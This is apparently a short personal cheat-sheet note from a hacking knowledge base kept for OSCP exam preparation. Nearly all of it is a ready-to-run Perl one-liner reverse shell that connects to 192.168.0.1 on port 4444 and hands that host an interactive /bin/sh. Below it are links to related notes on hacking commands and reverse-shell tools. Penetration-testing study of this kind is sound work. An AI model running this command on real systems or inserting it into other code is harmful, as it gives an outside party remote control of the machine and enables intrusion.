# Perl Reverse Shell
```
perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

` zet/20221003150554/README.md `

# Related

- [20221003150275](/zet/20221003150275/README.md) firefox reverse shell toolbar hacktools
- [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam

Tags:

    #hacking
